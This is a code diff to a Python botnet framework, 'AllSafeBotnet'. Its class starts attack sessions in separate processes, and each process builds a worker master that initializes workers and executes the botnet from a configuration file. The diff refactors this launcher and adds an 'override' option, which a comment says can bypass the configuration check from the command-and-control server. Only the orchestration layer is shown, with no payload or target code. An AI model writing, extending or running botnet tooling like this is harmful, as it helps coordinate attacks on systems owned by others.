@@ -217,32 +217,34 @@ class AllSafeBotnet():
         to another process an attack to be carried.
         """
         self._attack_counter = 0
-        print('BOTNET INIT PID', os.getpid())
 
-    def attack(self, configuration):
+    def attack(self, configuration, override=False):
         """
         Method to start a new attack session.
         @param: configuration, string - path to the configuration file
         """
-        self._attack_counter = 0 
+        self._attack_counter += 1
         botnet = self.Botnet(configuration)
         botnet.start()
 
     class Botnet(Process):
-        def __init__(self, configuration, name='AllSafeBotnetInstance'):
+        def __init__(self, configuration, name='AllSafeBotnetInstance', override=False):
             super().__init__(name=name)
             self._configuration = configuration
+            self._override_conf = override
+            # initialize master
+            self._allsafe_master = AllSafeWorkerMaster(self._configuration, override=self._override_conf)
 
         def run(self):
-            print('BOTNET RUN PID', os.getpid())
-            # simply creating a master and starting the attack
-            master = AllSafeWorkerMaster(self._configuration)
-            master.initializeWorkers()
-            master.executeBotnet()
+            # starting the attack
+            self._allsafe_master.initializeWorkers()
+            self._allsafe_master.executeBotnet()
         
 
 if __name__ == "__main__":
     # init botnet 
     allsafe = AllSafeBotnet()
     # attack (you can specify each time a different configuration file)
-    allsafe.attack('./utils/config_schema_example.json')
+    # note that you can override the configuration check from C&C 
+    # it can raise an exception in case of failure
+    allsafe.attack('./utils/config_schema_example.json', override=False)
